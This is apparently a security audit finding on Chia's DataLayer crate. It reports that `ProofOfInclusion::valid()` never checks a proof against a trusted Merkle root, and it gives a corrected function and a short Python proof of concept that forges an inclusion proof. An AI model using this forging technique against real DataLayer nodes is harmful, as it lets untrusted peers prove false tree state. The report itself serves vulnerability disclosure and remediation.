### Title
`ProofOfInclusion::valid()` Never Validates Against an External Root — Forged Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate only verifies the internal hash-chain consistency of the proof. It never checks the computed root against any externally trusted tree root. The final equality check in `valid()` is a tautology: it compares `existing_hash` (which equals `last.combined_hash` by construction of the loop) against `self.root_hash()` (which also returns `last.combined_hash`). An attacker who supplies a serialized `ProofOfInclusion` from an untrusted source can forge an internally consistent proof for any arbitrary key-value pair, and `valid()` will return `true`.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows: [1](#0-0) 

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← tautology
}
```

`root_hash()` is: [2](#0-1) 

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← derived from the proof itself
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which was already asserted equal to `layer.combined_hash` in the same iteration. Therefore `existing_hash == self.root_hash()` reduces to `last.combined_hash == last.combined_hash`, which is unconditionally `true`. The function never compares the computed root against any externally supplied, trusted tree root.

### Impact Explanation

An attacker who can deliver a crafted `ProofOfInclusion` to a DataLayer client (e.g., via a malicious peer node) can prove the inclusion of any arbitrary key-value pair in any DataLayer tree. Because `valid()` only checks that the hash chain is internally self-consistent — never that the chain's root matches the actual committed tree root — the attacker constructs a proof as follows:

1. Choose any target `node_hash` (the hash of the key-value pair to falsely prove).
2. Build a chain of `ProofOfInclusionLayer` entries where each `combined_hash` is correctly computed from the previous hash and an arbitrary `other_hash`.
3. `valid()` returns `true` for this fabricated proof.

This allows untrusted input to prove invalid state in the DataLayer Merkle tree, matching the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

### Likelihood Explanation

The `ProofOfInclusion` struct is serializable (`Streamable`) and exposed over the Python API. DataLayer nodes exchange proofs with peers. Any peer can send a forged proof. The attacker needs no special privileges — only the ability to send a serialized `ProofOfInclusion` to a node that calls `valid()` on it. The bug is in the core validation logic and is not gated by any flag or mode.

### Recommendation

`valid()` must accept an externally trusted root and compare the computed root against it. The corrected signature and body:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    // Compare against the externally trusted root, not the proof's own field
    &existing_hash == expected_root
}
```

All call sites — including the Python binding, the fuzz target, and the test suite — must be updated to supply the known tree root obtained from a trusted source (e.g., the committed on-chain root or the local `MerkleBlob`).

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Arbitrary target: claim key with this hash is in the tree
fake_node_hash = bytes([0xAA] * 32)
other_hash     = bytes([0xBB] * 32)

# Build one internally consistent layer
# combined_hash = calculate_internal_hash(fake_node_hash, side=0, other_hash)
# (use the same hash function the library uses)
combined = hashlib.sha256(b"\x01" + fake_node_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=0,
    other_hash=other_hash,
    combined_hash=combined,
)

proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True even though this proof was never generated
# from any real MerkleBlob and the root is completely fabricated.
assert proof.valid(), "Forged proof accepted!"
print("root_hash of forged proof:", proof.root_hash().hex())
```

The `valid()` call succeeds because the loop verifies `calculated_hash == layer.combined_hash` (true by construction) and the final check `existing_hash == self.root_hash()` reduces to `combined == combined`.
